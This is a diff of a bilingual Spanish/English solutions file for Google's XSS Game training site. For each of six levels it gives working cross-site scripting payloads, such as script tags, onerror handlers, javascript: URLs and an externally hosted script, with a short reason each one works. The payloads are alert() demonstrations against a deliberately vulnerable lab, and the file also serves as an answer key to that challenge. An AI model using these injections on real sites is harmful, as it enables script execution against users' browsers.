@@ -1,23 +1,42 @@
-Nivel 1: Hello, world of XSS  
+Nivel 1: Hello, world of XSS
 Query:https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
 Vector:<script>alert(1)</script>
-Nivel 2: Persistence is key       
+Por que / Why: el query se refleja sin escape en HTML / query reflected without escaping.
+
+Nivel 2: Persistence is key
 Query:https://xss-game.appspot.com/level2/frame
 post-content=<img src='foobar' onerror='alert("xss")'>
 Vector:
 <img src='foobar' onerror='alert("xss")'>
 "><img src=x onerror=alert(1)>
+</textarea><script>alert(1)</script>
+Por que / Why: cierra el textarea persistido e inyecta tag ejecutable / closes persisted textarea and injects executable tag.
 
-Nivel 3: That sinking feeling..   
+Nivel 3: That sinking feeling..
 Query:https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>
 Vector:'/><script>alert(1)</script>
-Nivel 4: Context matters 
+Tab-URL/hash:https://xss-game.appspot.com/level3/frame#1'><img src=x onerror=alert(1)>
+Por que / Why: el hash elige tab y se concatena en HTML/JS sin sanitizar / hash tab value concatenated into HTML without sanitizing.
+
+Nivel 4: Context matters
 Query:https://xss-game.appspot.com/level4/frame?timer=1')%3Balert('1
 Vector:1')%3Balert('1
-Nivel 5: Breaking protocol 
+startTimer:https://xss-game.appspot.com/level4/frame?timer=');alert(1);//
+Por que / Why: rompe el string de startTimer('...') y sale del contexto JS / breaks out of startTimer('...') JS string context.
+
+Nivel 5: Breaking protocol
 Query:https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
 Vector:javascript:alert(1)
+Flujo/Flow: abre /signup?next=javascript:alert(1) y haz clic en el link de confirm / open signup with next=javascript:... then click confirm link.
+Por que / Why: el parametro next acepta esquema javascript: y se usa como href / next parameter accepts javascript: scheme as link href.
+
 Nivel 6: Follow the whiterabbit(X)
 Query:https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
 Vector:data:text/plain,alert('xss')
-también se puede  HTTPS://cualquiersitiodondeesteelcontenidodelxss.js 
+Gadget/Angular:https://xss-game.appspot.com/level6/frame#https://example.com/xss.js
+tambien se puede HTTPS://cualquiersitiodondeesteelcontenidodelxss.js
+Por que / Why: el hash carga un gadget/script externo en contexto Angular / hash loads external gadget script in Angular context.
+
+---
+Documentacion con fines educativos / Educational purposes only. Sin afiliacion con Google / No affiliation with Google.
+Fecha de edicion / Last edited: 2026-09-26
